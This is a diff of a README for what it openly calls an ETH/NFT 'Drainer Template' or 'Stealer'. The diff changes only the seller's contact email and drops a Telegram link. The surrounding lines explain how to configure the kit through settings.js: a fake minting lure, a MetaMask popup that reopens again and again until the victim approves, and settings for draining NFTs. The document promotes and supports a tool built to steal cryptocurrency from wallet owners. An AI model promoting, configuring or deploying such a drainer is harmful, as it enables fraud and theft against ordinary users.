@@ -1,9 +1,8 @@
-### If you have questions or need any help, Email me here: darkhubgeek@gmail.com [Telegram]https://t.me/BitWallsOps
-
+### If you have questions or need any help, Email me here: arkaje0129@gmail.com
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
 ![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
-[Drainer V3 BETA VERSION] darkhubgeek@gmail.com [Telegram]https://t.me/BitWallsOps
+[Drainer V3 BETA VERSION] arkaje0129@gmail.com
 
 https://user-images.githubusercontent.com/108035292/210696593-0085a848-a2b4-4226-b6f4-0bc85287b3f9.mp4
 
@@ -26,8 +25,7 @@ you need to edit the **settings.js** file only.
   - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
   - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
   
-  To get instant support, contact me on darkhubgeek@gmail.com [Telegram]https://t.me/BitWallsOps
-
+  To get instant support, contact me on arkaje0129@gmail.com
 ## `👻 Important : `
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
